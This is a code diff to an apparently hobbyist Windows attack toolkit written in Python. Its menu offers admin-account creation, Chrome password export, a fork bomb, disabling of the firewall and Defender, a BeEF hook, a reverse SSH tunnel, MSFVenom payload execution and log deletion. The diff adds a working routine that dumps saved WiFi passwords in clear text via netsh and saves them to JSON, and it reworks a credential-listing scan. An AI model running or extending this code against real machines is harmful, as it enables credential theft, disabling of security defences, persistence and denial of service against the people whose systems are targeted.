@@ -141,7 +141,8 @@ while True:
 	MENU = {
 		"System & Scan": [
 			"result - Print current machine scan outcome",
-			"scan - Scan this machine"
+			"scan - Scan this machine",
+			"AddAdmin - Generate a new admin account"
 		],
 		"Connectivity": [
 		   "ssh - Attempt a local SSH connection",
@@ -152,11 +153,16 @@ while True:
 			"DiskFill - Fill disk space",
 			"DiskHost - Host a folder on port 8100",
 			"PassExport - Export Chrome passwords",
-			"DeleteLog - Delete logger.log"
+			"DeleteLog - Delete logger.log",
+			"NetScan - Run a basic netscan of local network"
 		],
 		"Critical Operations": [
 			"ForkBomb - Attempt a forkbomb",
-			"PortOpener - Disable firewall & defender"
+			"PortOpener - Disable firewall & defender",
+			"PacketCapture - Capture network packets",
+			"Venom - Run a Venom payload",
+			"WifiCrack - Attempt to crack WiFi passwords",
+			"Hook - Attempt to hook this machine via BeEF"
 		],
 		"Support & Exit": [
 			"info - Show details of a command",
@@ -275,11 +281,22 @@ while True:
 		sleep(0.1)
 		print("LogDelete) Delete the program log file: removes the logger.log file created by the program to store logs")
 		sleep(0.1)
+		print("")
+		sleep(0.1)
+		print("NetScan) Run a basic netscan of local network: performs a simple network scan to identify active devices on the local network")
+		sleep(0.1)
+		print("")
+		sleep(0.1)
+		print("WifiCrack) Attempt to crack WiFi passwords: tries to retrieve and crack saved WiFi passwords on the target machine")
+		sleep(0.1)
+		print("")
+		sleep(0.1)
 		print("exit) To exit the program")
 		sleep(0.1)
 		print("")
 		print_line()
 		input("Press Enter to continue...")
+		cls()
 
 #
 #
@@ -297,7 +314,7 @@ while True:
 #
 
 #Action result = Printing the outcome of the scan
-	if action == "result":
+	elif action == "result":
 		logging.info(f"Chosen action result to print system information")
 		if scanverify == "yes":
 			info()
@@ -326,8 +343,8 @@ while True:
 #
 #
 
-#action 1 = scanning the machine
-	if action == "scan":
+#action 'scan' = scanning the machine
+	elif action == "scan":
 		logging.info(f"Chosen action 1 to scan the machine")
 		scanverify = "yes"
 		cls()
@@ -409,7 +426,7 @@ while True:
 
 #Action hook = beef hook
 	#Action hook = beef hook
-	if action == "hook":
+	elif action == "hook":
 		logging.info(f"Chosen action hook to attempt beef hook")
 		pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
 		sleep(0.1)
@@ -473,7 +490,7 @@ while True:
 #
 
 #Action ssh = local SSH connection
-	if action == "ssh":
+	elif action == "ssh":
 		logging.info(f"Chosen action ssh to attempt local SSH connection")
 		print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
 		while True:
@@ -567,7 +584,7 @@ while True:
 #
 
 #Action ftp = FTP connection
-	if action == "ftp":
+	elif action == "ftp":
 		logging.info(f"Chosen action ftp to attempt FTP connection")
 		fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
 		run_ps(fwr21)
@@ -592,7 +609,7 @@ while True:
 #
 
 #Action ping = pinging target IP
-	if action == "ping":
+	elif action == "ping":
 		logging.info(f"Chosen action ping to check IP connectivity and response")
 		targetip=input("Enter target IP to ping: ")
 		subprocess.run(["ping", targetip])
@@ -614,7 +631,7 @@ while True:
 #
 
 #Action DiskFiller = filling up disk space
-	if action == "DiskFill" or action == "diskfill":
+	elif action == "DiskFill" or action == "diskfill":
 		logging.info(f"Chose action DiskFill to fill a target computer disk")
 		usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
 		if usermovefile == "y":
@@ -641,7 +658,7 @@ while True:
 #
 
 #Action DiskHoster = hosting target disk on local network
-	if action == "DiskHost" or action == "diskhost":
+	elif action == "DiskHost" or action == "diskhost":
 		logging.info(f"Chosen action DiskHost to host target disk onto a local network")
 		hostdisk="python -m http.server 8100 --bind 0.0.0.0"
 		run_ps(hostdisk)
@@ -668,7 +685,7 @@ while True:
 #
 
 #Action AddAdmin = creating new admin account on target machine
-	if action =="AddAdmin" or action == "addadmin":
+	elif action =="AddAdmin" or action == "addadmin":
 		logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
 		newadminuser=input("Enter new admin username: ")
 		sleep(0.1)
@@ -698,7 +715,7 @@ while True:
 #
 
 #Action PassExport = retrieving Chrome saved passwords
-	if action == "PassExport" or action == "passexport":
+	elif action == "PassExport" or action == "passexport":
 		logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
 		
 		# Check if we're on Windows
@@ -933,12 +950,7 @@ while True:
 		input(Fore.YELLOW + "\nPress Enter to continue...")
 		cls()
 
-	else:
-		print("")
-		sleep(0.1)
 
-
-#
 #
 #
 #
@@ -950,7 +962,7 @@ while True:
 #
 #Action ForkBomb = attempting a forkbomb
 
-	if action == "ForkBomb" or action == "forkbomb":
+	elif action == "ForkBomb" or action == "forkbomb":
 		logging.info(f"Chosen to attempt a forkbomb")
 		# Create the fork bomb batch file
 		run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
@@ -962,9 +974,6 @@ while True:
 		# Execute it
 		run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
 		
-		
-
-
 	#
 	#
 	#
@@ -977,7 +986,7 @@ while True:
 	# 
 
 #action PortOpener = opening ports in firewall
-	if action == "PortOpener" or action == "portopener":
+	elif action == "PortOpener" or action == "portopener":
 		logging.info(f"Chosen action PortOpener to open ports in firewall")
 		PortOpenerContinue=input("This action will take down the entire firewall and windows defender protection, are you sure you want to continue?")
 		if PortOpenerContinue == "y":
@@ -1032,7 +1041,7 @@ while True:
 #
   
 #action PacketCapture = capturing packets on target machine
-	if action == "PacketCapture" or action == "packetcapture":
+	elif action == "PacketCapture" or action == "packetcapture":
 		logging.info(f"Chosen action PacketCapture to capture packets")
 		run_ps('& "C:\\Program Files\\Wireshark\\dumpcap.exe" -D')
 
@@ -1057,7 +1066,7 @@ while True:
 #
 
 #Action Venom = running a Venom payload
-	if action == "Venom" or action == "venom":
+	elif action == "Venom" or action == "venom":
 		logging.info(f"Chosen action Venom to run a Venom payload")
 		venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
 		run_ps(venom)
@@ -1074,8 +1083,8 @@ while True:
 #
 #
 
-
-	if action =="DeleteLog" or action == "deletelog":
+#Action LogDelete = deleting the program log file
+	elif action =="DeleteLog" or action == "deletelog":
 		logging.shutdown()
 		os.remove("logger.log")
 
@@ -1091,31 +1100,86 @@ while True:
 #
 #
 
-	if action == "NetScan" or action == "netscan":
-		logging.info(f"Chosen action NetScan for network scan")
-		print(Fore.YELLOW + "[*] Running network scan...")
+
+
+	elif action == "WifiCrack" or action == "wificrack":
+		logging.info(f"Chosen action WifiPass to extract WiFi passwords")
+		print(Fore.YELLOW + "[*] Extracting WiFi passwords...")
 		
-		print(Fore.CYAN + "\n[1] Running: net use")
-		os.system('"C:\Windows\System32\net.exe" use')
+		try:
+			# Export ALL WiFi profiles with CLEAR TEXT passwords
+			print(Fore.CYAN + "[*] Exporting WiFi profiles...")
+			netsh_path = r"C:\Windows\System32\netsh.exe"
+			
+			# Create temp folder
+			temp_dir = "wifi_passwords_temp"
+			os.makedirs(temp_dir, exist_ok=True)
+			
+			# Export all profiles to XML with passwords
+			result = subprocess.run(
+				[netsh_path, "wlan", "export", "profile", "key=clear", f"folder={temp_dir}"],
+				capture_output=True,
+				text=True
+			)
+			
+			if "successfully" in result.stdout.lower():
+				print(Fore.GREEN + "[+] WiFi profiles exported with passwords!")
+				
+				# Parse all XML files
+				import glob
+				wifi_passwords = []
+				
+				for xml_file in glob.glob(os.path.join(temp_dir, "*.xml")):
+					try:
+						with open(xml_file, 'r', encoding='utf-8') as f:
+							content = f.read()
+							
+							# Extract SSID
+							import re
+							ssid_match = re.search(r'<name>([^<]+)</name>', content)
+							key_match = re.search(r'<keyMaterial>([^<]+)</keyMaterial>', content)
+							
+							if ssid_match and key_match:
+								ssid = ssid_match.group(1)
+								password = key_match.group(1)
+								
+								wifi_passwords.append({
+									"SSID": ssid,
+									"Password": password,
+									"File": os.path.basename(xml_file)
+								})
+								
+								print(Fore.CYAN + f"\n  SSID: {ssid}")
+								print(Fore.GREEN + f"  Password: {password}")
+					except Exception as e:
+						continue
+				
+				if wifi_passwords:
+					# Save to JSON
+					output_file = f"wifi_passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+					with open(output_file, 'w') as f:
+						json.dump(wifi_passwords, f, indent=4)
+					
+					print(Fore.GREEN + f"\n[+] Saved {len(wifi_passwords)} WiFi passwords to {output_file}")
+				else:
+					print(Fore.YELLOW + "[!] Could not extract passwords from XML files")
+				
+				# Cleanup
+				import shutil
+				shutil.rmtree(temp_dir, ignore_errors=True)
+			else:
+				print(Fore.RED + "[!] Failed to export WiFi profiles")
+				print(Fore.RED + f"Error: {result.stderr}")
 		
-		print(Fore.CYAN + "\n[2] Running: cmdkey /list")
-		os.system('"C:\Windows\System32\cmdkey.exe" /list')
+		except Exception as e:
+			print(Fore.RED + f"[!] Error: {e}")
 		
-		print(Fore.CYAN + "\n[3] Running: ipconfig")
-		os.system('"C:\Windows\System32\ipconfig.exe" /all')
-		
-		print(Fore.CYAN + "\n[4] Running: netstat -n (filtered)")
-		os.system('"C:\Windows\System32\netstat.exe" -n | findstr ":445 :139 :3389 :21 :22"')
-		
-		print(Fore.CYAN + "\n[5] Running: systeminfo (network)")
-		os.system('"C:\Windows\System32\systeminfo.exe" | findstr /C:"Domain" /C:"Host Name" /C:"OS"')
-		
-		print(Fore.GREEN + "\n[+] Scan complete!")
 		input("\nPress Enter to continue...")
 		cls()
 
 
-	if action == "NetworkPass" or action == "networkpass":
+
+	elif action == "NetScan" or action == "netscan":
 		logging.info(f"Chosen action NetworkPass to extract network passwords")
 		print(Fore.YELLOW + "[*] Extracting network information (passwords are encrypted)...")
 		
@@ -1193,16 +1257,17 @@ while True:
 		cls()
 
 #Action exit = exiting the program
-	if action == "exit":
+	elif action == "exit":
 		logging.info(f"Chosen action PassExport to exit the program")
 		print("Exiting the program...")
 		sleep(3)
 
 		exit()
 
+
 #INFOS!
 	
-	if action == "info result":
+	elif action == "info result":
 		print("result) Print current machine scan outcome (only usable after action 'scan'), usable for seeing scan results without having to rescan the machine") 
 		sleep(0.1) 
 		print("")
@@ -1210,7 +1275,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info scan":
+	elif action == "info scan":
 		print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address, stores the scan results in " \
 		"scan_results.json file") 
 		sleep(0.1) 
@@ -1219,7 +1284,7 @@ while True:
 		input("Press Enter to continue...") 
 		cls()
 
-	if action == "info hook":
+	elif action == "info hook":
 		print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine, opens the hook URL in default browser") 
 		sleep(0.1) 
 		print("")
@@ -1227,7 +1292,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info ssh":
+	elif action == "info ssh":
 		print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine, sets up a reverse SSH tunnel to attacker machine") 
 		sleep(0.1) 
 		print("")
@@ -1235,7 +1300,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info ftp":
+	elif action == "info ftp":
 		print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine, opens an FTP connection to attacker machine") 
 		sleep(0.1) 
 		print("")
@@ -1243,7 +1308,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info ping":
+	elif action == "info ping":
 		print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time") 
 		sleep(0.1) 
 		print("")
@@ -1251,7 +1316,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info DiskFill" or action == "info diskfill":
+	elif action == "info DiskFill" or action == "info diskfill":
 		print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine") 
 		sleep(0.1) 
 		print("")
@@ -1259,7 +1324,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info DiskHost" or action == "info diskhost":
+	elif action == "info DiskHost" or action == "info diskhost":
 		print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100") 
 		sleep(0.1) 
 		print("")
@@ -1267,7 +1332,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info AddAdmin" or action == "info addadmin":
+	elif action == "info AddAdmin" or action == "info addadmin":
 		print("AddAdmin) Generate a new admin account on target machine: creates a new user and adds it to local administrators group") 
 		sleep(0.1) 
 		print("")
@@ -1275,7 +1340,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info PassExport" or action == "info passexport":
+	elif action == "info PassExport" or action == "info passexport":
 		print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser, saves results to chrome_passwords.json") 
 		sleep(0.1) 
 		print("")
@@ -1283,7 +1348,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info ForkBomb" or action == "info forkbomb":
+	elif action == "info ForkBomb" or action == "info forkbomb":
 		print("ForkBomb) Attempt a forkbomb on current machine: creates and runs a batch file that continuously spawns new instances of itself, potentially crashing the system") 
 		sleep(0.1) 
 		print("")
@@ -1291,7 +1356,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info PortOpener" or action == "info portopener":
+	elif action == "info PortOpener" or action == "info portopener":
 		print("PortOpener) Open ports in firewall: disables Windows Firewall and Windows Defender real-time protection, deletes all existing firewall rules") 
 		sleep(0.1) 
 		print("")
@@ -1299,7 +1364,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 	
-	if action == "info PacketCapture" or action == "info packetcapture":
+	elif action == "info PacketCapture" or action == "info packetcapture":
 		print("PacketCapture) Capture packets on target machine: uses Wireshark's dumpcap to capture network packets on a specified interface and save them to a pcapng file") 
 		sleep(0.1) 
 		print("")   
@@ -1307,7 +1372,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info Venom" or action == "info venom":
+	elif action == "info Venom" or action == "info venom":
 		print("Venom) Run a Venom payload: allows the execution of an .exe file which was generated using MSFVenom and saved into VenomPayload using attackersetup.sh") 
 		sleep(0.1) 
 		print("")
@@ -1315,7 +1380,7 @@ while True:
 		input("Press Enter to continue...")
 		cls()
 
-	if action == "info DeleteLog" or action == "info deletelog":
+	elif action == "info DeleteLog" or action == "info deletelog":
 		print("LogDelete) Delete the program log file: removes the logger.log file created by the program to store logs") 
 		sleep(0.1) 
 		print("")
